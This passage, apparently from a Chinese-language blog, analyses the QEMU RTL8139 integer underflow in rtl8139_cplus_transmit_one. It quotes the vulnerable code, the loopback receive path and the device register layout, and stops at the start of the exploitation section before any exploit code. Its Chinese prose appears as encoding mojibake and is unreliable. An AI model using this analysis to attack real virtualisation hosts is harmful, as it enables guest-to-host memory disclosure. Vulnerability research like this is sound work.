¼å¼å‚è€ƒä¸‹å›¾ä¸­çš„ç°è‰²éƒ¨åˆ† [7]ï¼š</p><p><img src="/uploads/202006/ethernet-frame.png" alt="Ethernet Frame Format"></p><p>ç›¸å…³å­—æ®µè§£é‡Šï¼š</p><ul><li>DST / SRC ä¸ºç›®æ ‡ / æºçš„ MAC åœ°å€</li><li><p>Length / Typeï¼š</p><ul><li>å¦‚æœå€¼å°äºç­‰äº <code>1500</code> ï¼Œåˆ™è¡¨ç¤º Payload çš„é•¿åº¦</li><li>å¦åˆ™è¡¨ç¤º Payload æ•°æ®æ‰€ä½¿ç”¨çš„åè®®ï¼Œæ¯”å¦‚ <code>0x0800</code> è¡¨ç¤º IP åè®®ï¼ˆè¿™é‡ŒæŒ‡ IPv4ï¼‰</li></ul></li><li><p>Payload çš„ MTUï¼ˆMaximum Transmission Unitï¼‰ä¸º <code>1500</code> å­—èŠ‚ï¼Œå½“æ•°æ®è¶…å‡º MTU æ—¶éœ€è¦è¿›è¡Œåˆ†ç‰‡å¤„ç†</p></li></ul><h4 id="3-2-2-IP-Packet-Format"><a href="#3-2-2-IP-Packet-Format" class="headerlink" title="3.2.2 IP Packet Format"></a>3.2.2 IP Packet Format</h4><p>IP æ•°æ®åŒ…ï¼ˆè¿™é‡ŒæŒ‡ IPv4ï¼‰åœ¨ç½‘ç»œå±‚ä¼ è¾“ï¼Œæ ¼å¼å‚è€ƒä¸‹å›¾ [7]ï¼š</p><p><img src="/uploads/202006/ip-packet.png" alt="IP Packet Format"></p><p>ç›¸å…³å­—æ®µè§£é‡Šï¼š</p><ul><li>IHLï¼ˆInternet Header Lengthï¼‰è¡¨ç¤º IP Header çš„é•¿åº¦ï¼Œæœ€å¤§å¯ä»¥æ˜¯ <code>0b1111 * 4 = 60</code> å­—èŠ‚</li><li>Total Length è¡¨ç¤ºæ•´ä¸ª IP Packet çš„é•¿åº¦ï¼Œæœ€å¤§å¯ä»¥æ˜¯ <code>65535</code> å­—èŠ‚</li><li>IP Data çš„æœ€å¤§é•¿åº¦ä¸º <code>65535 - 20 = 65515</code> å­—èŠ‚<ul><li>æ­¤æ—¶ IP Header çš„é•¿åº¦ä¸º <code>20</code> å­—èŠ‚ï¼ŒOptions å­—æ®µçš„é•¿åº¦ä¸º <code>0</code> å­—èŠ‚</li></ul></li></ul><h4 id="3-2-3-TCP-Segment-Format"><a href="#3-2-3-TCP-Segment-Format" class="headerlink" title="3.2.3 TCP Segment Format"></a>3.2.3 TCP Segment Format</h4><p>TCP æŠ¥æ–‡åœ¨ä¼ è¾“å±‚ä¼ è¾“ï¼Œæ ¼å¼å‚è€ƒä¸‹å›¾ [7]ï¼š</p><p><img src="/uploads/202006/tcp-segment.png" alt="TCP Segment Format"></p><p>å’Œ IP æ•°æ®åŒ…ä¸€æ ·ï¼ŒTCP æŠ¥æ–‡å¤´éƒ¨çš„é•¿åº¦ç”± <code>Header Length</code> å­—æ®µæŒ‡æ˜ï¼Œæœ€å¤§å¯ä»¥æ˜¯ <code>0b1111 * 4 = 60</code> å­—èŠ‚ï¼Œåœ¨ <code>Options</code> å­—æ®µä¸ºç©ºçš„æƒ…å†µä¸‹å¤´éƒ¨é•¿åº¦ä¸º <code>20</code> å­—èŠ‚ã€‚</p><h3 id="3-3-æ¼æ´åˆ†æ"><a href="#3-3-æ¼æ´åˆ†æ" class="headerlink" title="3.3 æ¼æ´åˆ†æ"></a>3.3 æ¼æ´åˆ†æ</h3><p>æ¼æ´ä½äºæ–‡ä»¶ <code>hw\net\rtl8139.c</code> ä¸­çš„å‡½æ•° <code>rtl8139_cplus_transmit_one</code> ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_ADDR_LEN 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_TYPE_LEN 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_HLEN (ETHER_ADDR_LEN * 2 + ETHER_TYPE_LEN)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_P_IP    0x0800      <span class="comment">/* Internet Protocol packet */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_P_8021Q 0x8100      <span class="comment">/* 802.1Q VLAN Extended Header  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_MTU     1500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ip packet header */</span></span><br><span class="line">ip_header *ip = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> ip_data_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// saved_buffer æŒ‡å‘ Ethernet Frame, è¿™é‡Œè¯»å– Length/Type å­—æ®µ</span></span><br><span class="line"><span class="keyword">int</span> proto = be16_to_cpu(*(<span class="keyword">uint16_t</span> *)(saved_buffer + <span class="number">12</span>));</span><br><span class="line"><span class="keyword">if</span> (proto == ETH_P_IP)  <span class="comment">// Payload ä¸º IP Packet</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode has IP packet\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* not aligned */</span></span><br><span class="line">    eth_payload_data = saved_buffer + ETH_HLEN; <span class="comment">// Payload æ•°æ®</span></span><br><span class="line">    eth_payload_len  = saved_size   - ETH_HLEN; <span class="comment">// Payload å¤§å°</span></span><br><span class="line"></span><br><span class="line">    ip = (ip_header*)eth_payload_data;          <span class="comment">// IP Packet</span></span><br><span class="line">    <span class="comment">// æ£€æŸ¥æ˜¯å¦ä¸º IPv4</span></span><br><span class="line">    <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">        DPRINTF(<span class="string">"+++ C+ mode packet has bad IP version %d "</span></span><br><span class="line">            <span class="string">"expected %d\n"</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">            IP_HEADER_VERSION_4);</span><br><span class="line">        ip = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        hlen = IP_HEADER_LENGTH(ip);            <span class="comment">// IP å¤´é•¿åº¦</span></span><br><span class="line">        ip_protocol = ip-&gt;ip_p;</span><br><span class="line">        <span class="comment">// è®¡ç®— IP æ•°æ®åŒ…ä¸­æ•°æ®çš„é•¿åº¦, è¿™é‡Œ ip_data_len çš„ç±»å‹ä¸º uint16_t</span></span><br><span class="line">        <span class="comment">// å½“ be16_to_cpu(ip-&gt;ip_len) &lt; hlen è§¦å‘æ•´æ•°æº¢å‡º</span></span><br><span class="line">        <span class="comment">// ip_data_len æœ€å¤§å¯ä»¥æ˜¯ 0xFFFF</span></span><br><span class="line">        ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°è¯•ä» Ethernet Frame ä¸­è§£æ IPv4 æ•°æ®åŒ…ï¼Œåœ¨è®¡ç®— IP æ•°æ®åŒ…ä¸­çš„æ•°æ®é•¿åº¦æ—¶ï¼Œåœ¨è¿›è¡Œå‡æ³•è¿ç®—å‰å¹¶æ²¡æœ‰æ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°çš„å¤§å°å…³ç³»ï¼Œé€šè¿‡è§¦å‘æ•´æ•°æº¢å‡ºä½¿å¾— <code>ip_data_len</code> çš„æœ€å¤§å€¼å¯ä»¥æ˜¯ <code>0xFFFF</code> ã€‚</p><p>ç´§æ¥ç€æ˜¯å‘é€æ•°æ®åŒ…ï¼Œå¦‚æœæ˜¯ TCP æ•°æ®ï¼ˆ <code>IP_PROTO_TCP</code> ï¼‰ä¸”æ•°æ®é‡è¿‡å¤§ï¼ˆè®¾ç½®äº† <code>CP_TX_LGSEN</code> æ ‡è®°ï¼‰ï¼Œåˆ™ä¼šè¿›è¡Œåˆ†ç‰‡å¤„ç†ï¼Œå³åˆ‡åˆ†æˆå¤šä¸ª IP æ•°æ®åŒ…è¿›è¡Œå‘é€ï¼›æ­¤æ—¶ <code>ip_data_len</code> å°†è¢«ç”¨äºè®¡ç®— <code>tcp_data_len</code> çš„å€¼ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pointer to TCP header */</span></span><br><span class="line">tcp_header *p_tcp_hdr = (tcp_header*)(eth_payload_data + hlen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tcp_hlen = TCP_HEADER_DATA_OFFSET(p_tcp_hdr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ETH_MTU = ip header len + tcp header len + payload */</span></span><br><span class="line"><span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br></pre></td></tr></table></figure><p>éšåå¯¹ <code>tcp_data_len</code> é•¿åº¦çš„æ•°æ®æŒ‰ç…§ <code>tcp_chunk_size</code> çš„å¤§å°è¿›è¡Œåˆ†ç‰‡å‘é€ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> is_last_frame = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; </span><br><span class="line">     tcp_send_offset += tcp_chunk_size) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check if this is the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len)</span><br><span class="line">    &#123;</span><br><span class="line">        is_last_frame = <span class="number">1</span>;</span><br><span class="line">        chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add 4 TCP pseudoheader fields */</span></span><br><span class="line">    <span class="comment">/* copy IP source and destination fields */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(data_to_checksum, saved_ip_header + <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, </span><br><span class="line">            (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* keep PUSH and FIN flags only for the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (!is_last_frame)</span><br><span class="line">    &#123;</span><br><span class="line">        TCP_HEADER_CLEAR_FLAGS(p_tcp_hdr, TCP_FLAG_PUSH|TCP_FLAG_FIN);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* recalculate TCP checksum */</span></span><br><span class="line">    ip_pseudo_header *p_tcpip_hdr = (ip_pseudo_header *)data_to_checksum;</span><br><span class="line">    p_tcpip_hdr-&gt;zeros      = <span class="number">0</span>;</span><br><span class="line">    p_tcpip_hdr-&gt;ip_proto   = IP_PROTO_TCP;</span><br><span class="line">    p_tcpip_hdr-&gt;ip_payload = cpu_to_be16(tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">    p_tcp_hdr-&gt;th_sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tcp_checksum = ip_checksum(data_to_checksum, tcp_hlen + chunk_size + <span class="number">12</span>);</span><br><span class="line">    p_tcp_hdr-&gt;th_sum = tcp_checksum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* restore IP header */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(eth_payload_data, saved_ip_header, hlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set IP data length and recalculate IP checksum */</span></span><br><span class="line">    ip-&gt;ip_len = cpu_to_be16(hlen + tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* increment IP id for subsequent frames */</span></span><br><span class="line">    ip-&gt;ip_id = cpu_to_be16(tcp_send_offset/tcp_chunk_size + be16_to_cpu(ip-&gt;ip_id));</span><br><span class="line"></span><br><span class="line">    ip-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_sum = ip_checksum(eth_payload_data, hlen);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">    rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">        <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add transferred count to TCP sequence number */</span></span><br><span class="line">    p_tcp_hdr-&gt;th_seq = cpu_to_be32(chunk_size + be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line">    ++send_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°è£…å¥½çš„ Ethernet Frame é€šè¿‡å‡½æ•° <code>rtl8139_transfer_frame</code> å‘é€ï¼Œå‡½æ•°éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_transfer_frame</span><span class="params">(RTL8139State *s, <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> do_interrupt, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *dot1q_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ------------------------------- cut -------------------------------</span></span><br><span class="line">    <span class="keyword">if</span> (TxLoopBack == (s-&gt;TxConfig &amp; TxLoopBack))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> buf2_size;</span><br><span class="line">        <span class="keyword">uint8_t</span> *buf2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            buf2_size = iov_size(iov, <span class="number">3</span>);</span><br><span class="line">            buf2 = g_malloc(buf2_size);</span><br><span class="line">            iov_to_buf(iov, <span class="number">3</span>, <span class="number">0</span>, buf2, buf2_size);</span><br><span class="line">            buf = buf2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"+++ transmit loopback mode\n"</span>);</span><br><span class="line">        rtl8139_do_receive(qemu_get_queue(s-&gt;nic), buf, size, do_interrupt);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            g_free(buf2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ------------------------------- cut -------------------------------</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œå½“è®¾ç½®äº† <code>TxLoopBack</code> æ ‡è®°æ—¶ï¼Œä¼šç›´æ¥è°ƒç”¨ <code>rtl8139_do_receive</code> æ¥æ”¶æ•°æ®ï¼Œæ•°æ®ä¼šå†™å…¥åˆ°æ¥æ”¶ç¼“å†²åŒºä¸­ã€‚</p><h2 id="0x04-æ¼æ´åˆ©ç”¨"><a href="#0x04-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x04 æ¼æ´åˆ©ç”¨"></a>0x04 æ¼æ´åˆ©ç”¨</h2><h3 id="4-1-RTL8139-ç½‘å¡ç®€ä»‹"><a href="#4-1-RTL8139-ç½‘å¡ç®€ä»‹" class="headerlink" title="4.1 RTL8139 ç½‘å¡ç®€ä»‹"></a>4.1 RTL8139 ç½‘å¡ç®€ä»‹</h3><p>QEMU æ¨¡æ‹Ÿçš„ RTL8139 ç½‘å¡åœ¨å‘é€å’Œæ¥æ”¶æ•°æ®æ—¶ï¼Œå†…éƒ¨ä»£ç åˆ†æ”¯çš„èµ°å‘å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºç½‘å¡çš„çŠ¶æ€ï¼Œå¯¹åº”çš„ç»“æ„ä½“ä¸º <code>RTL8139State</code> ï¼ˆä½äºæ–‡ä»¶ <code>hw\net\rtl8139.c</code> ä¸­ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RTL8139State</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> phys[<span class="number">8</span>]; <span class="comment">/* mac address */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> mult[<span class="number">8</span>]; <span class="comment">/* multicast mask array */</span></span><br><span class="line">    <span class="comment">/* TxStatus0 in C mode*/</span> <span class="comment">/* also DTCCR[0] and DTCCR[1] in C+ mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> TxStatus[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> TxAddr[<span class="number">4</span>];   <span class="comment">/* TxAddr0 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> RxBuf;       <span class="comment">/* Receive buffer */</span></span><br><span class="line">    <span class="comment">/* internal variable, receive ring buffer size in C mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufferSize;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufPtr;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufAddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> IntrStatus;</span><br><span class="line">    <span class="keyword">uint16_t</span> IntrMask;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> TxConfig;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxConfig;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxMissed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> CSCR;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>  Cfg9346;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config0;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config1;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config3;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config4;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config5;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>  clock_enabled;</span><br><span class="line">    <span class="keyword">uint8_t</span>  bChipCmdState;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> MultiIntr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> BasicModeCtrl;</span><br><span class="line">    <span class="keyword">uint16_t</span> BasicModeStatus;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayAdvert;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayLPAR;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayExpansion;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> CpCmd;</span><br><span class="line">    <span class="keyword">uint8_t</span>  TxThresh;</span><br><span class="line"></span><br><span class="line">    NICState *nic;</span><br><span class="line">    NICConf conf;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C ring mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   currTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   cplus_enabled;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   currCPlusRxDesc;</span><br><span class="line">    <span class="keyword">uint32_t</span>   currCPlusTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   RxRingAddrLO;</span><br><span class="line">    <span class="keyword">uint32_t</span>   RxRingAddrHI;</span><br><span class="line"></span><br><span class="line">    EEprom9346 eeprom;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   TCTR;</span><br><span class="line">    <span class="keyword">uint32_t</span>   TimerInt;</span><br><span class="line">    <span class="keyword">int64_t</span>    TCTR_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tally counters */</span></span><br><span class="line">    RTL8139TallyCounters tally_counters;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Non-persistent data */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   *cplus_txbuffer;</span><br><span class="line">    <span class="keyword">int</span>        cplus_txbuffer_len;</span><br><span class="line">    <span class="keyword">int</span>        cplus_txbuffer_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* PCI interrupt timer */</span></span><br><span class="line">    QEMUTimer *timer;</span><br><span class="line"></span><br><span class="line">    MemoryRegion bar_io;</span><br><span class="line">    MemoryRegion bar_mem;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Support migration to/from old versions */</span></span><br><span class="line">    <span class="keyword">int</span> rtl8139_mmio_io_addr_dummy;</span><br><span class="line">&#125; RTL8139State;</span><br></pre></td></tr></table></figure><p><code>RTL8139State</code> ç»“æ„ä½“ä¸­çš„è®¸å¤šå­—æ®µå®é™…ä¸Šå°±æ˜¯ RTL8139 ç½‘å¡å†…éƒ¨çš„å¯„å­˜å™¨ï¼Œå…³äºè¿™äº›å¯„å­˜å™¨çš„æè¿°ï¼Œå¯ä»¥å‚è€ƒå‚å•† Realtek æä¾›çš„ Datasheet æ‰‹å†Œ [8]ï¼Œä¸‹å›¾ä¸º Phrack æ–‡ç«  [1] æä¾›çš„ä»‹ç»ï¼ˆè¿™é‡Œä¸º RTL8139 ç½‘å¡åœ¨ C+ æ¨¡å¼ä¸‹çš„å¯„å­˜å™¨ä»‹ç»ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x00    |           MAC0            |            MAR0            |</span><br><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x10    |                       TxStatus0                        |</span><br><span class="line">        +--------------------------------------------------------+</span><br><span class="line">0x20    |                        TxAddr0                         |</span><br><span class="line">        +-------------------+-------+----------------------------+</span><br><span class="line">0x30    |        RxBuf      |ChipCmd|                            |</span><br><span class="line">        +-------------+------+------+----------------------------+</span><br><span class="line">0x40    |   TxConfig  |  RxConfig   |            ...             |</span><br><span class="line">        +-------------+-------------+----------------------------+</span><br><span class="line">        |                                                        |</span><br><span class="line">        |             skipping irrelevant registers              |</span><br><span class="line">        |                                                        |</span><br><span class="line">        +---------------------------+--+------+------------------+</span><br><span class="line">0xd0    |           ...             |  |TxPoll|      ...         |</span><br><span class="line">        +-------+------+------------+--+------+--+---------------+</span><br><span class="line">0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |</span><br><span class="line">        +-------+------+------------+------------+---------------+</span><br></pre></td></tr></table></figure><ul><li>TxConfigï¼šå‘é€æ•°æ®ç›¸å…³çš„é…ç½®å‚æ•°</li><li>RxConfigï¼šæ¥æ”¶æ•°æ®ç›¸å…³çš„é…ç½®å‚æ•°</li><li>CpCmdï¼šC+ æ¨¡å¼ç›¸å…³é…ç½®å‚æ•°ï¼Œæ¯”å¦‚ï¼š<ul><li>CplusRxEnd è¡¨ç¤ºå¯ç”¨æ¥æ”¶</li><li>CplusTxEnd è¡¨ç¤ºå¯ç”¨å‘é€</li></ul></li><li>TxAddr0ï¼šTx descriptors table ç›¸å…³çš„ç‰©ç†å†…å­˜åœ°å€<ul><li>0x20 ~ 0x27ï¼šTransmit Normal Priority Descriptors Start Address</li><li>0x28 ~ 0x2Fï¼šTransmit High Priority Descriptors Start Address</li></ul></li><li>RxRingAddrLOï¼šRx descriptors table ç‰©ç†å†…å­˜åœ°å€ä½ 32 ä½</li><li>RxRingAddrHIï¼šRx descriptors table ç‰©ç†å†…å­˜åœ°å€é«˜ 32 ä½</li><li>TxPollï¼šè®©ç½‘å¡æ£€æŸ¥ Tx descriptors</li></ul><p>å…³äº <code>Descriptor</code> çš„å®šä¹‰ï¼ŒåŒæ ·å¯ä»¥å‚è€ƒå‚å•† Realtek æä¾›çš„ Datasheet æ‰‹å†Œ [8]ï¼Œä¸‹å›¾ä¸º <code>Transmit Descriptor</code> çš„å®šä¹‰ï¼š</p><p><img src="/uploads/202006/transmit-descriptor.png" alt="RTL8139 ç½‘å¡ Transmit Descriptor"></p><p>Phrack æ–‡ç«  [1] ç»™å‡ºçš„ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-2-Port-Mapped-I-O"><a href="#4-2-Port-Mapped-I-O" class="headerlink" title="4.2 Port Mapped I/O"></a>4.2 Port Mapped I/O</h3><p>CPU å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼å’Œå¤–è®¾è¿›è¡Œäº¤äº’ï¼ˆè¿™é‡Œä¸è®¨è®º IRQã€DMA ç­‰å…¶ä»–äº¤äº’æ–¹å¼ï¼‰ï¼š</p><ul><li>Memory Mapped I/O å³ MMIO</li><li>Port Mapped I/O å³ PMIO</li></ul><p>MMIO å°†å¤–è®¾çš„å†…å­˜å’Œå¯„å­˜å™¨ç›´æ¥æ˜ å°„åˆ°ç³»ç»Ÿçš„åœ°å€ç©ºé—´ä¸­ï¼ˆè¿™éƒ¨åˆ†ç©ºé—´é€šå¸¸æ˜¯ä¿ç•™ç»™å¤–è®¾ä¸“ç”¨çš„ï¼‰ï¼Œè¿™æ · CPU é€šè¿‡æ™®é€šçš„æ±‡ç¼–æŒ‡ä»¤å³å¯å’Œå¤–è®¾è¿›è¡Œäº¤äº’ï¼›è€Œ PMIO åˆ™å°†å¤–è®¾çš„å†…å­˜å’Œå¯„å­˜å™¨æ˜ å°„åˆ°éš”ç¦»çš„åœ°å€ç©ºé—´ä¸­ï¼ˆPMIO åœ°å€ç©ºé—´çš„å¤§å°ä¸º 64KBï¼‰ï¼ŒCPU é€šè¿‡ <code>in</code> å’Œ <code>out</code> æŒ‡ä»¤å’Œå¤–è®¾è¿›è¡Œäº¤äº’ã€‚</p><p>åœ¨ Windows ä¸‹ï¼Œå¯ä»¥é€šè¿‡è®¾å¤‡ç®¡ç†å™¨æŸ¥çœ‹è®¾å¤‡çš„ PMIO åœ°å€èŒƒå›´ï¼Œä¸‹å›¾ä¸º VMware SVGA 3D çš„ PMIO åœ°å€åŒºé—´ä¹‹ä¸€ï¼š</p><p><img src="/uploads/202006/vmware-svga-3d-pmio.png" alt="VMware SVGA 3D PMIO"></p><p>åœ¨ Linux ä¸‹å¯ä»¥ä½¿ç”¨ pciutils ä¸­çš„ <code>lspci</code> æŸ¥çœ‹è®¾å¤‡çš„ PMIO åœ°å€åŒºé—´ [9]ï¼Œè¿™é‡Œæµ‹è¯•ç”¨çš„ Ubuntu Server å·²ç»è‡ªå¸¦äº† pciutilsï¼Œåªéœ€è¦åœ¨å¯åŠ¨æ—¶æ·»åŠ  RTL8139 ç½‘å¡å³å¯ï¼Œå¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -m 2048 -drive \</span></span><br><span class="line">    file=~/Desktop/vm/ubuntu.img,format=qcow2,if=ide,cache=writeback \</span><br><span class="line">    -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">    -net user,hostfwd=tcp::2222-:22 -net nic</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ€åä¸€è¡Œçš„ä½œç”¨æ˜¯æŠŠ Ubuntu Server è™šæ‹Ÿæœºçš„ 22 ç«¯å£è½¬å‘åˆ°ä¸»æœºçš„ 2222 ç«¯å£ï¼Œæ–¹ä¾¿ä¸»æœºé€šè¿‡ SSH è®¿é—®è™šæ‹Ÿæœºï¼ˆVNC Viewer æ— æ³•å¤åˆ¶ç²˜è´´ï¼‰ï¼Œåœ¨ä¸»æœºä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯è¿æ¥è™šæ‹Ÿæœºï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh vmusername@127.0.0.1 -p 2222</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡ 